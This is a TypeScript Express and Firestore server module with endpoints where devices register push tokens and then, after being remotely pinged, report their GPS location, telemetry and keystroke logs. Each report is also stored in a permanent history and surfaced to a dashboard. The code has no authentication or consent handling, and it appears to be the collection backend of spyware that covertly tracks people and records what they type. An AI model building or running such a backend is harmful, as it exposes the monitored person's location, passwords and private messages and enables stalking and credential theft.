import { Router, type Request, type Response } from 'express';
import { FieldValue } from 'firebase-admin/firestore';
import { db } from '../firebase.js';

const router = Router();

// Endpoint for a device to register its FCM token on first launch
router.post('/register', async (req: Request, res: Response): Promise<void> => {
  try {
    const { deviceId, fcmToken, deviceName, deviceInfo } = req.body;
    
    if (!deviceId || !fcmToken) {
      res.status(400).json({ error: 'deviceId and fcmToken are required' });
      return;
    }

    const ipAddress = req.ip || req.socket.remoteAddress;

    await db.collection('devices').doc(deviceId).set({
      fcmToken,
      deviceName: deviceName || 'Unknown Device',
      deviceInfo: deviceInfo || {},
      ipAddress,
      lastUpdated: new Date().toISOString()
    }, { merge: true });

    res.status(200).json({ message: 'Device registered successfully' });
  } catch (error) {
    console.error('Error registering device:', error);
    res.status(500).json({ error: 'Failed to register device' });
  }
});

// Endpoint for a device to send its location back after being pinged
router.post('/location', async (req: Request, res: Response): Promise<void> => {
  try {
    let { deviceId, fcmToken, latitude, longitude, locationDetails, telemetry, keystrokeLog } = req.body;

    if ((!deviceId && !fcmToken) || latitude === undefined || longitude === undefined) {
      res.status(400).json({ error: 'deviceId (or fcmToken), latitude, and longitude are required' });
      return;
    }

    const lat = Number(latitude);
    const lng = Number(longitude);
    if (isNaN(lat) || isNaN(lng)) {
      res.status(400).json({ error: 'latitude and longitude must be valid numbers' });
      return;
    }

    const ipAddress = req.ip || req.socket.remoteAddress;

    // If deviceId is missing but fcmToken is provided (from background task)
    if (!deviceId && fcmToken) {
      const snapshot = await db.collection('devices').where('fcmToken', '==', fcmToken).limit(1).get();
      if (!snapshot.empty) {
        deviceId = snapshot.docs[0].id;
      } else {
        res.status(404).json({ error: 'Device not found for the given token' });
        return;
      }
    }

    const now = new Date();
    const timestamp = now.toISOString();
    const createdAt = now.getTime();

    const locationData = {
      latitude: lat,
      longitude: lng,
      ...(locationDetails || {})
    };

    // Sanitise keystroke log — must be an array
    const safeKeylog: any[] = Array.isArray(keystrokeLog) ? keystrokeLog : [];

    // 1. Maintain latest location + latest keylog on device document for fast dashboard queries
    await db.collection('devices').doc(deviceId).set({
      location: locationData,
      telemetry: telemetry || {},
      ipAddress,
      lastUpdated: timestamp,
      totalPings: FieldValue.increment(1),
      ...(safeKeylog.length > 0 ? { latestKeylog: safeKeylog, latestKeylogAt: timestamp } : {})
    }, { merge: true });

    // 2. Persist this ping to the history subcollection (never overwrite past pings)
    const historyEntry: any = {
      latitude: lat,
      longitude: lng,
      locationDetails: locationDetails || {},
      telemetry: telemetry || {},
      ipAddress: ipAddress || null,
      timestamp,
      createdAt
    };

    if (safeKeylog.length > 0) {
      historyEntry.keystrokeLog = safeKeylog;
      historyEntry.keystrokeCount = safeKeylog.length;
    }

    const historyRef = await db
      .collection('devices')
      .doc(deviceId)
      .collection('history')
      .add(historyEntry);

    res.status(200).json({
      message: 'Location updated and saved to history successfully',
      historyId: historyRef.id,
      keystrokesReceived: safeKeylog.length,
      timestamp
    });
  } catch (error) {
    console.error('Error updating location:', error);
    res.status(500).json({ error: 'Failed to update location' });
  }
});

export default router;

